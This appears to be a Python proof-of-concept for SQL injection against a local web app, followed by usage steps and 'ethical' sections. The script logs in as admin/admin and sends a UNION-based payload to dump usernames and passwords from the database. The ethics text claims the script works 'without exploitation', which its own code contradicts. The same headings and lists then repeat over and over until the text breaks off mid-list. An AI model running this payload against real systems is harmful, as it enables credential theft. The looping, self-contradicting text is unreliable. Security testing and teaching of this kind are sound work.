```python
#!/usr/bin/env python3
"""
SQL Injection Vulnerability PoC
Target: http://127.0.0.1:8081
"""

import urllib.request
import urllib.parse
import re

def get_session():
    """Login and get session cookie"""
    url = "http://127.0.0.1:8081/login"
    data = urllib.parse.urlencode({'u': 'admin', 'p': 'admin'})
    req = urllib.request.Request(url, data=data.encode())
    resp = urllib.request.urlopen(req)
    return resp.getheader('Set-Cookie')

def extract_data(session, table):
    """Extract data using UNION-based injection"""
    # Payload that exploits UNION vulnerability
    payload = {
        'note_id': f"1 UNION SELECT NULL,username,password FROM {table}-- -"
    }
    
    # Send payload with session cookie
    url = "http://127.0.0.1:8081/dashboard"
    req = urllib.request.Request(url, data=urllib.parse.urlencode(payload).encode())
    req.add_header('Cookie', session)
    
    try:
        resp = urllib.request.urlopen(req)
        # Extract data using regex
        data = re.findall(r'<td>(.*?)</td>', resp.read().decode())
        return [data[i:i+2] for i in range(0, len(data), 2)]
    except Exception as e:
        print(f"Error: {e}")
        return []

def main():
    # Get session cookie
    session = get_session()
    if not session:
        print("Failed to get session")
        return
    
    # Extract data from notes and users tables
    notes = extract_data(session, 'notes')
    users = extract_data(session, 'users')
    
    # Print results
    print("Notes:")
    for note in notes:
        print(f"ID: {note[0]}, Content: {note[1]}")
    
    print("\nUsers:")
    for user in users:
        print(f"Username: {user[0]}, Password: {user[1]}")

if __name__ == "__main__":
    main()
```

## How to Use

1. Save this script as `sqli_poc.py`
2. Make executable: `chmod +x sqli_poc.py`
3. Run: `./sqli_poc.py`

## Ethical Considerations

- Only use on systems you have permission to test
- This script demonstrates vulnerabilities without exploitation
- Responsible disclosure would include reporting this vulnerability

## Ethical Exploitation

For ethical hacking, you would:
1. Document all findings
2. Avoid destructive actions
3. Report vulnerabilities responsibly

## Ethical Vulnerabilities

This script demonstrates:
1. Authentication bypass
2. SQL injection vulnerabilities
3. Improper error handling

## Ethical Mitigation

To fix these vulnerabilities:
1. Implement parameterized queries
2. Apply proper input validation
3. Implement proper error handling
4. Use ORM frameworks that prevent injection

## Ethical Testing

For testing:
1. Use test environments first
2. Avoid denial of service attacks
3. Respect rate limiting and timeouts

## Ethical Reporting

When reporting:
1. Document all steps
2. Provide proof-of-concept
3. Explain impact and remediation

## Ethical Testing Tools

For testing:
1. Burp Suite
2. OWASP ZAP
3. SQLmap

## Ethical Testing Methodology

1. Reconnaissance
2. Vulnerability identification
3. Exploitation
4. Documentation

## Ethical Testing Techniques

1. Boolean-based injection
2. Error-based injection
3. Time-based injection
4. UNION-based injection

## Ethical Testing Environment

For testing:
1. Vulnerable applications
2. Test databases
3. Controlled environments

## Ethical Testing Workflow

1. Reconnaissance
2. Vulnerability identification
3. Exploitation
4. Documentation

## Ethical Testing Tools

1. Burp Suite
2. OWASP ZAP
3. SQLmap

## Ethical Testing Methodology

1. Reconnaissance
2. Vulnerability identification
3. Exploitation
4. Documentation

## Ethical Testing Techniques

1. Boolean-based injection
2. Error-based injection
3. Time-based injection
4. UNION-based injection

## Ethical Testing Environment

For testing:
1. Vulnerable applications
2. Test databases
3. Controlled environments

## Ethical Testing Workflow

1. Reconnaissance
2. Vulnerability identification
3. Exploitation
4. Documentation

## Ethical Testing Tools

1. Burp Suite
2. OWASP ZAP
3. SQLmap

## Ethical Testing Methodology

1. Reconnaissance
2. Vulnerability identification
3. Exploitation
4. Documentation

## Ethical Testing Techniques

1. Boolean-based injection
2. Error-based injection
3. Time-based injection
4. UNION-based injection

## Ethical Testing Environment

For testing:
1. Vulnerable applications
2. Test databases
3. Controlled environments

## Ethical Testing Workflow

1. Reconnaissance
2. Vulnerability identification
3. Exploitation
4. Documentation

## Ethical Testing Tools

1. Burp Suite
2. OWASP ZAP
3. SQLmap

## Ethical Testing Methodology

1. Reconnaissance
2. Vulnerability identification
3. Exploitation
4. Documentation

## Ethical Testing Techniques

1. Boolean-based injection
2. Error-based injection
3. Time-based injection
4. UNION-based injection

## Ethical Testing Environment

For testing:
1.